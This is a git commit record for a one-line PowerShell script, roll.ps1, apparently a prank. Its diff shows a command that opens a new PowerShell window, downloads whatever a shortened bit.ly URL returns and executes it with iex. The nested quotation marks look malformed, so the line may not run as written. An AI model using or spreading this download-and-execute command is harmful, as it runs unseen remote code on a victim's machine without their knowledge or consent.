330a7e1b80ff7491ef65f1e593b47cd9209ea75b
KffeePt <95396642+KffeePt@users.noreply.github.com>
2021-12-04 19:40:53 -0600

    Update roll.ps1

--- roll.ps1
+++ roll.ps1
@@ -1,1 +1,1 @@
-Start-Process PowerShell.exe -ArgumentList "-noexit", "iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+Start-Process PowerShell.exe -ArgumentList "-noexit", "-command iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")"
